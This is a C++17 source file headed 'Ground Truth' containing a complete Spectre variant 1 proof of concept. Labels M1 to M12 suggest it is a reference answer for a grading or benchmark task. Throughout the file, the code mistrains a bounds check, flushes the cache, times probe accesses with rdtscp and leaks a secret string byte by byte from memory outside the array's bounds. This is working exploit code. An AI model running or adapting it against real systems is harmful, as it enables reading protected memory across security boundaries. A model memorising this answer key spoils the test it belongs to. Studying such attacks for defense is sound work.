// Ground Truth (C++17)
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <x86intrin.h>

static unsigned int array1_size = 16;
static std::uint8_t unused1[64];
static std::uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
static std::uint8_t unused2[64];
static std::uint8_t array2[256 * 512];

static char* secret = const_cast<char*>("The Magic Words are Squeamish Ossifrage.");
static std::uint8_t temp = 0;

// M1. Victim: Bounds-Checked, Secret-Dependent Access
// static void victim_function(std::size_t x) {
//   if (x < array1_size) {
//     temp &= array2[static_cast<std::size_t>(array1[x]) * 512];
//   }
// }

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

#define CACHE_HIT_THRESHOLD 80

static void readMemoryByte(std::size_t malicious_x, std::uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  std::size_t safe_x, x;
  std::uint64_t time1, time2, time_difference;
  volatile std::uint8_t* addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;

  for (tries = 999; tries > 0; tries--) {
    // M5. Cache Eviction Targets
    for (i = 0; i < 256; i++)
      _mm_clflush(&array2[i * 512]);

    safe_x = static_cast<std::size_t>(tries) % array1_size;

    // M4. Loop Sequence Correctness (Train → Evict → Delay → Invoke)
    for (j = 29; j >= 0; j--) {
      // M5. Cache Eviction Targets
      _mm_clflush(&array1_size);

      // M6. Controlled Delay (Window Extension)
      for (volatile int z = 0; z < 100; z++) {}

      // M3. Controlled Branch Misprediction (Interleaved, Branchless)
      int cond = (j % 6 == 0); // 1 or 0
      x = safe_x + static_cast<std::size_t>(cond) * (malicious_x - safe_x);
      victim_function(x);
    }

    for (i = 0; i < 256; i++) {
      // M7. Mixed Probe Order (Stride/Index Masking)
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[static_cast<std::size_t>(mix_i) * 512];

      // M8. Measuring Memory Access Time through High-Resolution Timer
      time1 = __rdtscp(&junk);
      (void)*addr;
      time2 = __rdtscp(&junk);
      time_difference = time2 - time1;

      // M9. Hit/Miss Classification Threshold
      if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x])
        results[mix_i]++;
    }

    // M10. Score Accumulation & Early-Stop
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j; j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break;
  }

  value[0] = static_cast<std::uint8_t>(j);
  score[0] = results[j];
  value[1] = static_cast<std::uint8_t>(k);
  score[1] = results[k];
}

int main() {
  // M2. Secret Reachability (OOB Path)
  std::size_t malicious_x = static_cast<std::size_t>(secret - reinterpret_cast<char*>(array1));
  int score[2];
  int Length = static_cast<int>(std::strlen(secret));
  std::uint8_t value[2];

  // M11. Array/Probe Initialization
  for (std::size_t i = 0; i < sizeof(array2); i++) {
    array2[i] = 1;
  }

  std::printf("Reading %d bytes:\n", Length);

  // M12. Multi-Byte Extraction Loop
  while (--Length >= 0) {
    std::printf("Reading at malicious_x = %p... ", reinterpret_cast<void*>(malicious_x));
    readMemoryByte(malicious_x++, value, score);
    std::printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    std::printf("0x%02X='%c' score=%d ",
      value[0],
      (value[0] > 31 && value[0] < 127 ? static_cast<int>(value[0]) : '?'),
      score[0]);
    std::printf("\n");
  }
  return 0;
}
